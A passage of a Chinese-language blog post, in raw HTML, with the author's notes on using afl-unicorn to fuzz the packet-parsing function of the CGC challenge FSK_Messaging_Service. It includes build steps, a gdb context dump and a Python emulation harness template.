uc.emu_start(uc.reg_read(UC_MIPS_REG_PC), end_address, timeout=<span class="number">0</span>, count=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Execution failed with error: &#123;&#125;"</span>.format(e))</span><br><span class="line">        force_crash(e)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Done."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>看一下第二篇<br><a href="https://hackernoon.com/afl-unicorn-part-2-fuzzing-the-unfuzzable-bea8de3540a5" target="_blank" rel="noopener">https://hackernoon.com/afl-unicorn-part-2-fuzzing-the-unfuzzable-bea8de3540a5</a></p><h3 id="task1-FSK-Messaging-Service"><a href="#task1-FSK-Messaging-Service" class="headerlink" title="task1 FSK_Messaging_Service"></a>task1 FSK_Messaging_Service</h3><p>第二篇以一个相对具体的例子，将afl-unicorn的使用场景从不到30行的case扩展到了一个CGC CTF题<br>FSK_Messaging_Service<br>题目描述是这样的：这是一项服务，该服务实现了具有分组FSK解调前端，分组解码，处理以及最终将其解析为简单Messenger服务的分组无线接收器。</p><h4 id="step0"><a href="#step0" class="headerlink" title="step0"></a>step0</h4><p>安装afl-unicorn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;path&#x2F;to&#x2F;afl-unicorn</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">cd unicorn_mode</span><br><span class="line">sudo .&#x2F;build_unicorn_support.sh</span><br></pre></td></tr></table></figure><p>另外这里还有个坑，如果你在18.04系统上不能运行起来它，可以试试16.04，这卡了我几个小时。</p><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>首要的工作是对要fuzz的代码进行理解，也就是说理清楚要fuzz的起点和终点，需要构造的输入是什么？输入是如何传递进去的，输入上有哪些约束，比如最大最短长度，是否需要满足某个具体的算式，这个约束是不变的还是动态的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-064150.jpg" alt=""></p><p>虽然我其实不太看得懂这些东西，但是粗略的理解来说就是如果直接构造输入喂进去，那么会卡在Demodulation Logic部分，永远无法正确的突破。<br>可以粗略的理解成，如果你用AFL去fuzz js引擎，那它几乎不太可能去生成有效的js语法，会卡在语法parser那里，举个例子,for进行一轮字节变异成aor，能通过才见鬼了。</p><p>而通过AFL-unicorn我们可以直接过掉前面这部分代码，直接将Message Packet Parsing Logic作为Harness，把Packets作为原始输入去fuzz。</p><p>但其实看到这里，Packet的构造还是存在一定问题的，首先即使这个Packet喂进去了造成Crash，如何从更上层输入去构造出这个Packet，会不会有更上层的过滤导致永远不可能构造出来这个Packet，这都是很容易考虑到的问题，不过这里暂时略过这个问题往下看吧。</p><p>从Packets做输入，那么关键代码就在packet.c里，<br><a href="https://github.com/trailofbits/cb-multios/blob/master/challenges/FSK_Messaging_Service/src/packet.c" target="_blank" rel="noopener">https://github.com/trailofbits/cb-multios/blob/master/challenges/FSK_Messaging_Service/src/packet.c</a><br>选择要fuzz的函数是cgc_receive_packet<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-095657.png" alt=""><br>函数的基本功能如下：</p><ol><li>校验packet buffer不为空且长度大于0</li><li>计算16位CRC校验和以验证数据包的内容</li><li>循环检查packet type，如果匹配，则调用cgc_add_new_packet实例化tSinglePacketData对象pNewPacket，并向其中memcpy来自原始数据包的信息。</li></ol><p>现在我们开始考虑参数和约束<br>void cgc_receive_packet( uint8_t *pData, uint8_t dataLen, uint16_t packetCRC )<br>pData是指向数据包的指针，dataLen是其长度，packetCRC是16位CRC校验和。<br>显而易见的约束是CRC要正确。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Perform Checksum check</span></span><br><span class="line"><span class="keyword">uint16_t</span> check_checksum = cgc_simple_checksum16( pData, dataLen );</span><br><span class="line"><span class="comment">// Validate Checksum</span></span><br><span class="line"><span class="keyword">if</span> ( packetCRC != check_checksum )</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>其实看到这里就感觉没必要继续看下去了，价值很有限了。<br>简单地说接下来的工作是要dump出有效的进程上下文，这个原因十分简单，在之前我们学习Unicorn的时候就遇到了很多问题，有很多运行时才会分配的内存区域，比如堆分配、栈指针、全局变量这些东西。<br>但是说到底……<strong>我要是能把固件跑起来，我还要你这个仿真干嘛</strong><br>问题就在这里了，所以我感觉除了极小量级的代码可能还能用一下，越是复杂，接口不规范的东西，越是不可能用这个东西跑起来了。<br>但权做学习吧。</p><p>afl-unicorn的helper tools<br><a href="https://github.com/Battelle/afl-unicorn/blob/master/unicorn_mode/helper_scripts/unicorn_dumper_ida.py" target="_blank" rel="noopener">https://github.com/Battelle/afl-unicorn/blob/master/unicorn_mode/helper_scripts/unicorn_dumper_ida.py</a></p><p>IDA的版本要求&lt;7，我试一下gdb版的能不能用。<br><a href="https://github.com/Battelle/afl-unicorn/blob/master/unicorn_mode/helper_scripts/unicorn_dumper_gdb.py" target="_blank" rel="noopener">https://github.com/Battelle/afl-unicorn/blob/master/unicorn_mode/helper_scripts/unicorn_dumper_gdb.py</a></p><p>选择在此处断下，此时eax中存放pData，edx（dl)里存放dataLen<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-100802.png" alt=""><br>在此处dump进程上下文。</p><p>我在这卡住了，因为我想了想我好像并不知道该怎么hit到cgc_receive_packet的代码，在进行了”繁琐”的逆向工程之后。<br>我找到了作者的issue。<br><a href="https://github.com/Battelle/afl-unicorn/issues/9" target="_blank" rel="noopener">https://github.com/Battelle/afl-unicorn/issues/9</a><br>它给了一个patch用来生成有效输入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pov &gt; case</span><br><span class="line"></span><br><span class="line">sakura@ubuntu:~&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;challenges&#x2F;FSK_Messaging_Service$ .&#x2F;FSK_Messaging_Service &lt; case</span><br><span class="line">[[RECEIVER STARTED -- TIMESTAMP: 1453110580]]</span><br><span class="line">Total 12 bytes received and 0 invalid packets.</span><br><span class="line">Displaying 2 received packets:</span><br><span class="line">Displaying packet 0 type 3:</span><br><span class="line">[CONNECT MESSAGE]ASDF connected</span><br><span class="line">Displaying packet 1 type 3:</span><br><span class="line">[CONNECT MESSAGE]ASDF connected</span><br></pre></td></tr></table></figure><p>差不多效果这样。<br>然后开始dump上下文了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unicorn$ gdb .&#x2F;FSK_Messaging_Service</span><br><span class="line">Reading symbols from .&#x2F;FSK_Messaging_Service...done.</span><br><span class="line">gef➤  b *0x804D106</span><br><span class="line">Breakpoint 1 at 0x804d106: file &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;challenges&#x2F;FSK_Messaging_Service&#x2F;src&#x2F;baseband.c, line 330.</span><br><span class="line">gef➤  x&#x2F;5i 0x804D106</span><br><span class="line">   0x804d106 &lt;cgc_do_sample+854&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x804d109 &lt;cgc_do_sample+857&gt;:movzx  eax,dl</span><br><span class="line">   0x804d10c &lt;cgc_do_sample+860&gt;:mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x804d110 &lt;cgc_do_sample+864&gt;:movzx  eax,WORD PTR [ecx+0x126]</span><br><span class="line">   0x804d117 &lt;cgc_do_sample+871&gt;:mov    DWORD PTR [esp+0x8],eax</span><br><span class="line">gef➤  r &lt; case</span><br><span class="line">Starting program: &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;FSK_Messaging_Service &lt; case</span><br><span class="line">[[RECEIVER STARTED -- TIMESTAMP: 1453110580]]</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0xffffd3c6  →  0x53410403</span><br><span class="line">$ebx   : 0x0</span><br><span class="line">$ecx   : 0xffffd3a0  →  0xf7fd0002  →  0x306cf7fd</span><br><span class="line">$edx   : 0xffffd306  →  0x00000000</span><br><span class="line">$esp   : 0xffffd1e0  →  0xcccccccd</span><br><span class="line">$ebp   : 0xffffd208  →  0xffffd238  →  0xffffd258  →  0xffffd4d8  →  0x00000000</span><br><span class="line">$esi   : 0xc0d2</span><br><span class="line">$edi   : 0x0</span><br><span class="line">$eip   : 0x0804d106  →  &lt;cgc_do_sample+854&gt; mov DWORD PTR [esp], eax</span><br><span class="line">$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063</span><br><span class="line">───────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffd1e0│+0x0000: 0xcccccccd ← $esp</span><br><span class="line">0xffffd1e4│+0x0004: 0x40308ccc</span><br><span class="line">0xffffd1e8│+0x0008: 0x00000000</span><br><span class="line">0xffffd1ec│+0x000c: 0x40310000</span><br><span class="line">0xffffd1f0│+0x0010: 0x00000000</span><br><span class="line">0xffffd1f4│+0x0014: 0x40080000</span><br><span class="line">0xffffd1f8│+0x0018: 0x04000000</span><br><span class="line">0xffffd1fc│+0x001c: 0x00000000</span><br><span class="line">─────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x804d0fd &lt;cgc_do_sample+845&gt; mov    ecx, DWORD PTR [ebp+0x8]</span><br><span class="line">    0x804d100 &lt;cgc_do_sample+848&gt; mov    dl, BYTE PTR [ecx+0x23]</span><br><span class="line">    0x804d103 &lt;cgc_do_sample+851&gt; mov    ecx, DWORD PTR [ebp+0x8]</span><br><span class="line"> →  0x804d106 &lt;cgc_do_sample+854&gt; mov    DWORD PTR [esp], eax</span><br><span class="line">    0x804d109 &lt;cgc_do_sample+857&gt; movzx  eax, dl</span><br><span class="line">    0x804d10c &lt;cgc_do_sample+860&gt; mov    DWORD PTR [esp+0x4], eax</span><br><span class="line">    0x804d110 &lt;cgc_do_sample+864&gt; movzx  eax, WORD PTR [ecx+0x126]</span><br><span class="line">    0x804d117 &lt;cgc_do_sample+871&gt; mov    DWORD PTR [esp+0x8], eax</span><br><span class="line">    0x804d11b &lt;cgc_do_sample+875&gt; call   0x804d9f0 &lt;cgc_receive_packet&gt;</span><br><span class="line">───────────────────────────────────── source:&#x2F;home&#x2F;sakura&#x2F;un[...].c+330 ────</span><br><span class="line">    325 #if DEBUG_BASEBAND</span><br><span class="line">    326 cgc_printf( &quot;Packet RX[$d][$X]\n&quot;, pState-&gt;packetState.packetDataLen, pState-&gt;packetState.packetCRC );</span><br><span class="line">    327 #endif</span><br><span class="line">    328</span><br><span class="line">    329 &#x2F;&#x2F; Packet received! -- send to packet processing</span><br><span class="line">            &#x2F;&#x2F; pState&#x3D;0xffffd210  →  [...]  →  0x306cf7fd</span><br><span class="line"> →  330 cgc_receive_packet( pState-&gt;packetState.packetData, pState-&gt;packetState.packetDataLen, pState-&gt;packetState.packetCRC );</span><br><span class="line">    331</span><br><span class="line">    332 &#x2F;&#x2F; Reset</span><br><span class="line">    333 cgc_reset_baseband_state( pState );</span><br><span class="line">    334 &#125;</span><br><span class="line">    335 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;FSK_Messaging_S&quot;, stopped 0x804d106 in cgc_do_sample (), reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x804d106 → cgc_do_sample(pState&#x3D;0xffffd3a0, sample_in&#x3D;0x0)</span><br><span class="line">[#1] 0x804ccbb → cgc_run_cdr(pState&#x3D;0xffffd3a0, in_sample&#x3D;0x0)</span><br><span class="line">[#2] 0x804ca25 → cgc_process_sample(pState&#x3D;0xffffd3a0, in_sample&#x3D;0x0)</span><br><span class="line">[#3] 0x804e6cd → main(secret_page_i&#x3D;0x4347c000, unused&#x3D;0xffffd574)</span><br><span class="line">────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804d106 in cgc_do_sample (pState&#x3D;0xffffd3a0, sample_in&#x3D;0x0) at &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;challenges&#x2F;FSK_Messaging_Service&#x2F;src&#x2F;baseband.c:330</span><br><span class="line">330cgc_receive_packet( pState-&gt;packetState.packetData, pState-&gt;packetState.packetDataLen, pState-&gt;packetState.packetCRC );</span><br><span class="line">gef➤</span><br><span class="line">gef➤  source unicorn_dumper_gdb.py</span><br><span class="line">----- Unicorn Context Dumper -----</span><br><span class="line">You must be actively debugging before running this!</span><br><span class="line">If it fails, double check that you are actively debugging before running.</span><br><span class="line">Process context will be output to UnicornContext_20200405_045024</span><br><span class="line">Dumping segment @0x0000000008048000 (size:0x7000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;FSK_Messaging_Service [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x000000000804f000 (size:0x1000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;FSK_Messaging_Service [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x0000000008050000 (size:0x22000): [heap] [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x000000004347c000 (size:0x1000):  [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7dbd000 (size:0x1d5000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Skipping segment &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so@0x00000000f7f92000</span><br><span class="line">Dumping segment @0x00000000f7f93000 (size:0x2000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7f95000 (size:0x1000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7f96000 (size:0x3000):  [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fc5000 (size:0x1000):  [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fc6000 (size:0x3000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;tiny-AES128-C&#x2F;libtiny-AES128-C.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fc9000 (size:0x1000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;tiny-AES128-C&#x2F;libtiny-AES128-C.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fca000 (size:0x1000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;tiny-AES128-C&#x2F;libtiny-AES128-C.so [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fcb000 (size:0x3000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;libcgc.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fce000 (size:0x1000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;libcgc.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fcf000 (size:0x1000): &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;cb-multios&#x2F;build&#x2F;include&#x2F;libcgc.so [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fd0000 (size:0x2000):  [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Exception reading segment ([vvar]): &lt;class &#39;gdb.MemoryError&#39;&gt;</span><br><span class="line">Dumping segment @0x00000000f7fd5000 (size:0x1000): [vdso] [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7fd6000 (size:0x26000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7ffc000 (size:0x1000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: False, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000f7ffd000 (size:0x1000): &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Dumping segment @0x00000000fffdd000 (size:0x21000): [stack] [&#123;&#39;r&#39;: True, &#39;w&#39;: True, &#39;x&#39;: True&#125;]</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure><p>大概这样。<br>粗略看了一下dump程序，基本上就是调用了gef的get_process_maps接口，然后依次把每个segment的内存保存下来和调用get_register接口保存寄存器信息。</p><h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><p>接下来就开始编写harness了。<br>其实用c来写比python效率要快很多，但是为了快速学习，这里就用python搞一下。<br>整体的Harness的流程就是：</p><ol><li>创建和分配memory map</li><li>加载target程序到memory map</li><li>仿真执行至少一条指令(hack trick)</li><li>从afl获取data和size用以fuzz</li><li>设置初始状态，即进程上下文</li><li>仿真代码，并正确处理crash</li></ol><p>基本上每个harness都是这样，对着往里面填模板就好了。<br>这里的<a href="https://github.com/Battelle/afl-unicorn/blob/master/unicorn_mode/helper_scripts/unicorn_loader.py" target="_blank" rel="noopener">unicorn_loader</a>在这。<br>用处就是把我们之前dump出来的context加载进去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *  <span class="comment"># <span class="doctag">TODO:</span> Set correct architecture here as necessary</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> unicorn_loader </span><br><span class="line"></span><br><span class="line"><span class="comment"># Simple stand-in heap to prevent OS/kernel issues</span></span><br><span class="line">unicorn_heap = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start and end address of emulation</span></span><br><span class="line">START_ADDRESS = <span class="comment"># <span class="doctag">TODO:</span> Set start address here</span></span><br><span class="line">END_ADDRESS   = <span class="comment"># <span class="doctag">TODO:</span> Set end address here</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Implement target-specific hooks in here.</span></span><br><span class="line"><span class="string">    Stub out, skip past, and re-implement necessary functionality as appropriate</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicorn_hook_instruction</span><span class="params">(uc, address, size, user_data)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> Setup hooks and handle anything you need to here</span></span><br><span class="line">    <span class="comment">#    - For example, hook malloc/free/etc. and handle it internally</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------</span></span><br><span class="line"><span class="comment">#---- Main test function  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'context_dir'</span>, type=str, help=<span class="string">"Directory containing process context"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'input_file'</span>, type=str, help=<span class="string">"Path to the file containing the mutated input content"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-d'</span>, <span class="string">'--debug'</span>, default=<span class="literal">False</span>, action=<span class="string">"store_true"</span>, help=<span class="string">"Dump trace info"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Loading context from &#123;&#125;"</span>.format(args.context_dir))</span><br><span class="line">    uc = unicorn_loader.AflUnicornEngine(args.context_dir, enable_trace=args.debug, debug_print=<span class="literal">False</span>)       </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Instantiate the hook function to avoid emulation errors</span></span><br><span class="line">    <span class="keyword">global</span> unicorn_heap</span><br><span class="line">    unicorn_heap = unicorn_loader.UnicornSimpleHeap(uc, debug_print=<span class="literal">True</span>)</span><br><span class="line">    uc.hook_add(UC_HOOK_CODE, unicorn_hook_instruction)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Execute 1 instruction just to startup the forkserver</span></span><br><span class="line">    <span class="comment"># <span class="doctag">NOTE:</span> This instruction will be executed again later, so be sure that</span></span><br><span class="line">    <span class="comment">#       there are no negative consequences to the overall execution state.</span></span><br><span class="line">    <span class="comment">#       If there are, change the later call to emu_start to no re-execute </span></span><br><span class="line">    <span class="comment">#       the first instruction.</span></span><br><span class="line">    print(<span class="string">"Starting the forkserver by executing 1 instruction"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        uc.emu_start(START_ADDRESS, <span class="number">0</span>, <span class="number">0</span>, count=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"ERROR: Failed to execute a single instruction (error: &#123;&#125;)!"</span>.format(e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Allocate a buffer and load a mutated input and put it into the right spot</span></span><br><span class="line">    <span class="keyword">if</span> args.input_file:</span><br><span class="line">        print(<span class="string">"Loading input content from &#123;&#125;"</span>.format(args.input_file))</span><br><span class="line">        input_file = open(args.input_file, <span class="string">'rb'</span>)</span><br><span class="line">        input_content = input_file.read()</span><br><span class="line">        input_file.close()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Apply constraints to mutated input here</span></span><br><span class="line">        <span class="keyword">raise</span> exceptions.NotImplementedError(<span class="string">'No constraints on the mutated inputs have been set!'</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Allocate a new buffer and put the input into it</span></span><br><span class="line">        buf_addr = unicorn_heap.malloc(len(input_content))</span><br><span class="line">        uc.mem_write(buf_addr, input_content)</span><br><span class="line">        print(<span class="string">"Allocated mutated input buffer @ 0x&#123;0:016x&#125;"</span>.format(buf_addr))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Set the input into the state so it will be handled</span></span><br><span class="line">        <span class="keyword">raise</span> exceptions.NotImplementedError(<span class="string">'The mutated input was not loaded into the Unicorn state!'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Run the test</span></span><br><span class="line">    print(<span class="string">"Executing from 0x&#123;0:016x&#125; to 0x&#123;1:016x&#125;"</span>.format(START_ADDRESS, END_ADDRESS))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = uc.emu_start(START_ADDRESS, END_ADDRESS, timeout=<span class="number">0</span>, count=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># If something went wrong during emulation a signal is raised to force this </span></span><br><span class="line">        <span class="comment"># script to crash in a way that AFL can detect ('uc.force_crash()' should be</span></span><br><span class="line">        <span class="comment"># called for any condition that you want AFL to treat as a 